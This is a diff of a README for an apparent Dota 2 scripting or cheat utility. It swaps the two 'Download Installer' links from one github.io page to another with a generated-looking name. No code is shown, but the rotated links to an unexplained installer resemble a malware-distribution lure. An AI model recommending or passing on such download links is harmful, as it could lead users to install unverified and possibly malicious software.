@@ -2,7 +2,7 @@
 
 Dota 2 Script Utility 2026 is an advanced tool developed for Windows users to enhance their Dota 2 gaming experience. This utility provides a suite of scripts and customization options that allow players to tailor the game to their preferences. Released in 2026, it is designed to be lightweight, easy to use, and compatible with the latest Dota 2 updates.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -72,6 +72,6 @@ For any issues or suggestions, you can open an issue on the GitHub repository. J
 
 ## Download
 
-[Get the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Get the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 © 2026 Dota 2 Script Utility. All rights reserved. Last updated: October 2026.
